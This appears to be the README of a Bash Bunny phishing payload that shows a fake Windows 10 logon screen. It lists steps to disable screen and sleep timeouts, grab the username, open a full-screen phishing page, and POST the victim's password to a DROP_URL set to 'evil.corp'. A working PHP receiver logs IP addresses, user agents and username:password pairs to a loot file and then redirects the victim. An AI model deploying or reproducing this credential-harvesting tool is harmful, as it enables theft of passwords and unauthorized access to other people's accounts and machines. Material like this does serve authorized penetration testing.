# "Microsoft Windows 10" Fake Logon Screen

- Title:         "Microsoft Windows 10" Fake Logon Screen
- Author:        TW-D
- Version:       1.0
- Target:        Microsoft Windows 10
- Category:      Phishing

## Description

1) Change "monitor-timeout (AC and DC)" at NEVER with "powercfg" utility.
2) Change "standby-timeout (AC and DC)" at NEVER with "powercfg" utility.
3) Retrieve the current username.
4) Full-screen opening of the phishing HTML page using the default web browser with a random wallpaper.
5) The "Bash Bunny" can be removed because the files are cached in the web browser.
6) The password will be sent by HTTP POST to the URL specified in the "DROP_URL" constant.

## Configuration

From "payload.txt" change the values of the following constants :
```bash

######## INITIALIZATION ########

readonly BB_LABEL="BashBunny"
readonly DROP_URL="http://evil.corp:8080/drop.php?ZXZpbC5jb3Jw.png"
readonly INPUT_PLACEHOLDER="Password"


```

Example of code for the data receiver :
```php
<?php

if (
    $_SERVER['REQUEST_METHOD'] === 'POST' &&
    isset($_POST['username']) && !empty($_POST['username']) &&
    isset($_POST['password']) && !empty($_POST['password'])
) {

    $remote_addr = (string) $_SERVER['REMOTE_ADDR'];
    $user_agent = (string) $_SERVER['HTTP_USER_AGENT'];
    $username = (string) $_POST['username'];
    $password = (string) $_POST['password'];

    /*
        touch ./aGFrNQ_loot.log
        chown www-data:www-data ./aGFrNQ_loot.log
    */
    $loot = fopen('aGFrNQ_loot.log', 'a');
    fwrite($loot, "##\n");
    fwrite($loot, $remote_addr . "\n");
    fwrite($loot, $user_agent . "\n");
    fwrite($loot, $username . ':' . $password . "\n");
    fwrite($loot, "##\n");
    fclose($loot);

}

http_response_code(302);
header('Location: https://hak5.org/');
exit;

?>
```